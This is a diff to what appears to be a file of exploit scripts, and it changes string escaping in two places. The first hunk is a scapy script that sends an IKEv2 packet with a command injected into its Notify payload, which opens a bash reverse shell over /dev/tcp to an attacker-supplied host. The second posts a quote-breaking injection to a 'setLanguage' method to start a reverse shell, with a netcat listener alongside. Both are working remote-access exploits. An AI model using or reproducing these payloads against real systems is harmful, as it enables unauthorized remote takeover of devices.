@@ -759,7 +759,7 @@ from scapy.all import *
 
 load_contrib('ikev2')
 
-cmd = "\";bash -c \"exec bash -i &>/dev/tcp/" + sys.argv[2] + "/" + sys.argv[3] + " <&1;\";echo -n \""
+cmd = "\\";bash -c \\"exec bash -i &>/dev/tcp/" + sys.argv[2] + "/" + sys.argv[3] + " <&1;\\";echo -n \\""
 
 packet = IP(dst = sys.argv[1]) / UDP(dport = 500) / IKEv2(init_SPI = RandString(8), next_payload = 'Notify', exch_type = 'IKE_SA_INIT', flags='Initiator') / IKEv2_payload_Notify(next_payload = 'Nonce', type = 14, load = "HAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXB" + cmd) / IKEv2_payload_Nonce(next_payload = 'None', load = RandString(68))
 
@@ -2889,7 +2889,7 @@ if sys.argv[1] == 'shell':
     t = threading.Thread(target=os.system, args=(NC_COMMAND,))
     t.start()
 
-    print("[+] Sending reverse shell to %s...\n" % victim)
+    print("[+] Sending reverse shell to %s...\\n" % victim)
     json = {"method": "setLanguage", "params": {"payload": "';" + REVERSE_SHELL % (attacker, PORT) + ";'"}}
     requests.post(url, json=json, verify=False)
 
